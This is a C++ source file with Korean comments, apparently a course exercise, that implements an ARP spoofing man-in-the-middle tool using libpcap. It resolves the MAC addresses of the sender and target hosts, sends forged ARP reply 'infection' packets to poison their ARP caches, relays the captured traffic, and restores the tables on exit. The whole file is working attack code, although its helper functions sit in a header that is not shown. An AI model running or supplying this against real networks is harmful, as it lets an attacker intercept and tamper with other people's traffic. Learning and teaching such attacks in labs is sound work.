#include "send-arp.h"



int main(int argc, char* argv[]) {
	void (*signal_hand)(int);
	signal_hand = signal(SIGINT, sigint_handler);

	// 입력 인자 개수가 4개 이상이어야 하며 짝수여야함.
	if (argc < 4 || argc % 2 != 0) {
		usage();
		return -1;
	}

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}
	
	std::map<Ip, Mac> ARPtable;
	getMyInfo(dev, ARPtable);
	Ip sender, target, me = getMyIp(dev);

	int now = 2;


	// 전처리를 하자 
	// resolve를 미리 다 해놓자
	std::vector <pair<Ip, Ip>> IpTable; // {sender, target}
	while(now < argc) {
		initArg(&argv[now], sender, target);
		IpTable.push_back({sender, target});
		// sender랑 target Mac 찾기
		// 휴대폰 화면 꺼져있으면 Mac주소 못찾음..
		if(resolveMac(handle, ARPtable, me, sender) == FAIL) return 0;
		if(resolveMac(handle, ARPtable, me, target) == FAIL) return 0;

		now = now + 2;
	}

	// 디버깅용
	for(auto i = ARPtable.begin(); i != ARPtable.end(); i++) {
		cout << string(i->first) << ' ' << uint32_t(i->first) << ' ' << string(i->second) << endl;
	}
	for(auto i = IpTable.begin(); i != IpTable.end(); i++) {
		cout << string(i->first) << ' '  << string(i->second) << endl;
	}

	// infection 실행
	cout << "infection start" << endl;
	for(auto i : IpTable) {
		infectionPacket.push_back(fillPacket(ARPtable[me], ARPtable[i.first], ARPtable[me], i.second, ARPtable[i.first], i.first, ArpHdr::Reply));
	}
	pthread_t t;
	int tid = pthread_create(&t, NULL, infection, (void*)handle);



	// watchPacket으로
	// IP 패킷일 경우 => flow로 
	// ARP 패킷일 경우 => 감염으로 대응해줘야 함
	// 1초당 1번씩 보내고 있을 때 그닥 걱정은 안됨
	// 더 큰 주기로 보낸다 했을 때 ARP Table 복구를 염두해야함.
	// 종료는 ctrl + c로 signal 보내서 가능
	watchPacket(handle, ARPtable, IpTable, me); // while 조건문 1로 해둠
	

	cout << "infection end" << endl;
	
	pthread_join(tid, NULL);

	cout << "recover start" << endl;



	for(auto i : IpTable) {
		recover(handle, ARPtable, i.first, i.second);
	}


	cout << "program end" << endl;
	// handle이 먼저 종료되면 기존에 handle로 처리한더거 처리 못함
	pcap_close(handle);
	return 0;
}
